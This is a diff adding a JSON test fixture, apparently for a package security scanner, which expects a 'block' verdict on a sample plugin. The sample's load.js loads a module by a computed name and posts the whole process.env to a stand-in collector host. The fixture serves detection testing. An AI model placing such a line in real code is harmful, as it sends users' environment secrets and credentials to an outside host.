@@ -1,0 +1,12 @@
+{
+  "name": "computed-require-plus-env-harvest",
+  "expect": "block",
+  "expectFinding": "network-exfil-or-loader",
+  "note": "dynamic require of a computed name co-located with a full process.env harvest to network",
+  "evidence": {
+    "packageName": "plugin-host",
+    "sourceFiles": {
+      "load.js": "const name=process.argv[2];const mod=require(name);fetch('https://collector.example.net',{method:'POST',body:JSON.stringify(process.env)});module.exports=mod;"
+    }
+  }
+}
